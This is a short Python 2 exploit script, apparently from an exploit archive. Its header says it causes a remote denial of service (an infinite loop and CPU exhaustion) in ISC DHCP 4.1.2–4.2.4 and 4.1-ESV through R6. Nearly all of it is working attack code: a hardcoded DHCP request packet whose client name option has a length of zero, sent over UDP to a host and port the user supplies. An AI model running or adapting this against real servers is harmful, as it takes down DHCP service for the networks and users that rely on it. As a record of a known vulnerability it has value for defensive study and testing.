&#039;&#039;&#039;
    SC DHCP 4.1.2 <> 4.2.4 and 4.1-ESV <> 4.1-ESV-R6 remote denial of
    service(infinite loop and CPU consumption/chew) via zero&#039;ed client name length
 
http://www.k1p0d.com
 
&#039;&#039;&#039;
 
import socket
import getopt
from sys import argv
 
def main():
    args = argv[1:]
    try:
        args, useless = getopt.getopt(args, &#039;p:h:&#039;)
        args = dict(args)
        args[&#039;-p&#039;]
        args[&#039;-h&#039;]
    except:
        usage(argv[0])
        exit(-1)
 
    dhcp_req_packet = (&#039;\x01\x01\x06\x00\x40\x00\x03\x6f&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x22\x5f\xae&#039;
    &#039;\xa7\xdf\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x63\x82\x53\x63&#039;
    &#039;\x35\x01\x03\x32\x04\x0a\x00\x00&#039;
    &#039;\x01\x0c\x00&#039;
    &#039;\x37\x0d\x01\x1c\x02\x03\x0f&#039;
    &#039;\x06\x77\x0c\x2c\x2f\x1a\x79\x2a&#039;
    &#039;\xff\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
    &#039;\x00\x00\x00\x00&#039;)
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((args[&#039;-h&#039;], int(args[&#039;-p&#039;])))
    sock.sendall(dhcp_req_packet)
    print &#039;Packet sent&#039;
    sock.close()
 
def usage(pyname):
    print &#039;&#039;&#039;
    Usage: %s -h <host> -p <port>
&#039;&#039;&#039; % pyname
 
if __name__ == "__main__":
    main()



